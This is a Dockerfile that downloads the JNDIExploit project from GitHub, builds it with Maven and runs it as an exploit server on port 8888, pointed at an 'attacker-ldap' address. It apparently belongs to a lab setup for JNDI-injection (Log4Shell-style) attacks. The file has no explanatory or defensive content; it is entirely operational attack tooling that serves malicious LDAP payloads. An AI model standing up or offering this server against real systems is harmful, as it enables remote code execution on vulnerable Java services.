FROM alpine:3
WORKDIR /opt/app
RUN apk add openjdk8 maven
RUN wget https://github.com/zzwlpx/JNDIExploit/archive/refs/heads/master.zip
RUN unzip master
WORKDIR /opt/app/JNDIExploit-master
RUN mvn package
EXPOSE 8888
CMD ["java", "-jar", "target/JNDIExploit-1.0-SNAPSHOT.jar", "-i", "attacker-ldap", "-p", "8888"]